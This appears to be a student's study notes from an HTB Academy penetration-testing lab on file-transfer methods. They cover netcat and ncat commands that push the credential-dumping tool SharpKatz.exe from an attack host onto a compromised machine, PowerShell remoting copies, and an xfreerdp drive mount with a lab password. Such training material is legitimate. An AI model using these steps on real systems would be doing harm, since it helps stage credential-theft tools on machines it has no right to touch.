- Introduction
- File Transfer with Netcat and Ncat
- PowerShell Session File Transfer
- RDP




# Introduction

File Transfer can also be achieved with other methods like #Netcat , #Ncat , using #RDP , and #PowerShell .

# Netcat :

#Netcat is a computer Networking utility designed for reading and writing to network connections using TCP, UDP. Which means we can transfer Files with it.
In this section we will be working with Ncat and Netcat.

# File Transfer with Netcat and Ncat :

In this Exemple, well transfer SharpKatz.exe from our Box to the Target machine. There are two ways to do it.

## Netcat - Compromised Machine - Liatening on Port 8000 :

```shell
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

In this syntaxe we are Listening ```-l``` on the Target Machine on the Port ```-p 8000 ``` for Upcoming connections. redirecting stdout ``` > ``` to the File we want to receive SharpKatz.exe .

##  Netcat - Attack Host - Sending File to Compromised machine :

From our attack host, we will connect to the compromised machine on Port 8000 using Netcat and send the File SharpKatz.exe as input to Netcat.
The option ```-q 0 ``` will tell Netcat to close the connection once it received the File :

```shell
Thibovski@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```


## Ncat - Compromised Machine - Listening on Port 8000 :

If the Target is using #Ncat well need to specify ```--recv-only``` to close the connections once the file transfered is finished.

```shell
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

## Ncat - Attack Host - Sending File to Compromised machine :

If we are using Ncat in our attack host, we can use ```--send-only``` instead of ```q``` .
```--send-only``` can be runed als listner and receiver to close the connexion once we received our File.

```shell
Thibovski@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

The Other option is to send the File direct to the Target Machine (Without Listening):

## Attack Host - Sending File as Input to Netcat :

```shell
Thibovski@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## Compromised Machine Connect to Netcat to Receive the File :

```shell
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Lets do the same with #Ncat :

## Attack Host - Sending File as Input to Ncat :

```shell
Thibovski@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## Compromised Machine Connect to Ncat to Receive the File :

```shell
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

# PowerShell Session File Transfer :

If HTTP, HTTPS, or SMB are not available we can use #PowerShell_Remoting , aka #WinRM to perform a File Transfer.
Enabling #PowerShell creates remotely both an HTTP and HTTPS listner on the Ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PoweShell Remoting we need adminitrative access (Be member of <span style="color: #ADCCFFA6;">Remote Management Users</span>).

To confirm the use of WinRM we use the commend <span style="color: #ABF7F7A6;">Test-NetConnect</span>.
(Look also at : [[Windows File Transfer Methods]])

```powershell
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

## Create a PowerShell Remoting Session to DATABASE01 :

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```
Create a New Session and store the variable in ```$Session``` .

## Copy samplefile.txt from our Localhost to the DATABASE01 Session :

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

```Copy-Item``` is used to copy Files.

## Copy DATABASE.txt from DATABASE01 Session to our Localhost :

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

# RDP :

#RDP (Remote Desktop Protocol) is commonly used in Windows for Networking ans Remote Access.
we can install ```xfreerdp```  ( #xfreerdp ) 

As an alternative to copy and past we can mount a local resource on the target RDP server :

## Mounting a Linux Folder Using xfreerdp :

```shell
Thibovski@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to ```\\tsclient\\``` , allowing us to transfer files to/from the RDP session.
![image](RDP.png)